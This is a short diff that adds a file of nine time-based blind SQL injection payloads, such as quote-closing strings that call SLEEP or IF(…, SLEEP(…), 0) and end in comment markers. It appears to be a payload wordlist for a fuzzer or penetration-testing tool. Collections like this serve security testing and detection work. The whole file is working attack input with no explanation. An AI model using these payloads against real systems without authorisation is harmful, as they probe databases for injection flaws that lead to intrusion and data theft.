@@ -1,0 +1,9 @@
+' OR SLEEP(5) --
+" OR SLEEP(5) --
+' OR IF(1=1, SLEEP(4), 0) --
+" OR IF(1=1, SLEEP(4), 0) --
+1) OR SLEEP(3)#
+1' AND SLEEP(3) --
+" AND SLEEP(3) --
+')) OR SLEEP(4) --
+')) OR IF(2>1, SLEEP(3), 0) --
